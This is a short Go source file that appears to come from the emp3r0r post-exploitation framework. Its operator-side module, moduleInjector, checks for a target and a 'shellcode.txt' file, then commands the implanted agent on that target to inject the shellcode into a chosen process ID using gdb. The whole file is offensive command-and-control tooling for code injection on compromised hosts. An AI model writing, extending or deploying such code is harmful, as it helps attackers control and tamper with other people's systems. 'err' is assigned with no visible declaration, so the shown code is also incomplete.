package cc

import "github.com/jm33-m0/emp3r0r/core/internal/agent"

func moduleInjector() {
	// target
	target := CurrentTarget
	if target == nil {
		CliPrintError("Target not exist")
		return
	}

	// upload shellcode.txt
	pid := Options["pid"].Val
	if !agent.IsFileExist(WWWRoot + "shellcode.txt") {
		CliPrintError("%sshellcode.txt does not exist", WWWRoot)
		return
	}

	// tell agent to inject this shellcode
	err = SendCmd("!inject gdb "+pid, target)
	if err != nil {
		CliPrintError("Could not send command to agent: %v", err)
		return
	}
	CliPrintInfo("Please wait...")
}
